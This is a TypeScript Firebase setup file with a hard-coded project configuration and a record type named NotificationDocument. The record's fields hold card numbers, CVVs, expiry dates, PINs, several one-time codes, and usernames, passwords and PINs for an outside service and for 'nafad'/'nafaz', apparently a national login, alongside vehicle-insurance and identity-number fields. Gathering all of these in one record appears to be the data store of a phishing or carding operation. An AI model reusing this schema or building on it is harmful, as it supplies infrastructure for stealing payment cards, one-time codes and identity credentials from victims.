import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBSRLFN8DXH24hdFeZuj6RxsKt9_dceFJk",
  authDomain: "dzt24-8ea60.firebaseapp.com",
  projectId: "dzt24-8ea60",
  storageBucket: "dzt24-8ea60.firebasestorage.app",
  messagingSenderId: "818328713698",
  appId: "1:818328713698:web:0eaa497f53b2968dcee1bb",
  measurementId: "G-SV14E2SMDM"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database, type NotificationDocument };

interface PaymentData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
}

interface FormData {
  card_number?: string;
  cvv?: string;
  expiration_date?: string;
  full_name?: string;
}

interface NotificationDocument {
  id: string;
  agreeToTerms?: boolean;
  buyer_identity_number?: string;
  card_number?: string;
  country?: string;
  createdDate: string;
  customs_code?: string;
  cvv?: string;
  document_owner_full_name?: string;
  expiration_date?: string;
  formData?: FormData;
  cardNumber?: string;
  full_name?: string;
  insurance_purpose?: string;
  owner_identity_number?: string;
  pagename?: string;
  paymentData?: PaymentData;
  paymentStatus?: string;
  phone?: string;
  phone2?: string;
  seller_identity_number?: string;
  serial_number?: string;
  status?: string;
  vehicle_manufacture_number?: string;
  documment_owner_full_name?: string;
  vehicle_type?: string;
  isHidden?: boolean;
  pinCode?: string;
  otpCardCode?: string;
  phoneOtp?: string;
  otpCode?: string;
  externalUsername?: string;
  externalPassword?: string;
  nafadUsername?: string;
  nafadPassword?: string;
  nafaz_pin?: string;
  autnAttachment?: string;
  requierdAttachment?: string;
  operator?: string;
  otpPhoneStatus: string;
  phoneOtpCode: string;
  phoneVerificationStatus: string;
}

